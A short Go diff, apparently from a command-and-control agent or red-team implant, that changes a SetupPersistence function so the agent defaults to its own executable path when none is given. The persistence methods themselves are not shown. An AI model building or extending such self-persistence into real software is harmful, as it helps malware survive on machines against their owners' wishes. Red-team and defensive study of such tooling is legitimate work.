@@ -48,6 +48,15 @@ func SetupPersistence(method, name, agentPath string, args []string) error {
 	// Normalize the method name
 	normalizedMethod := normalizeMethod(method)
 
+	// Default to own executable when no path specified
+	if agentPath == "" {
+		self, err := os.Executable()
+		if err != nil {
+			return fmt.Errorf("failed to resolve agent executable path: %w", err)
+		}
+		agentPath = self
+	}
+
 	fmt.Printf("[*] Setting up persistence: method=%s (normalized from %s), name=%s, path=%s\n",
 		normalizedMethod, method, name, agentPath)
 
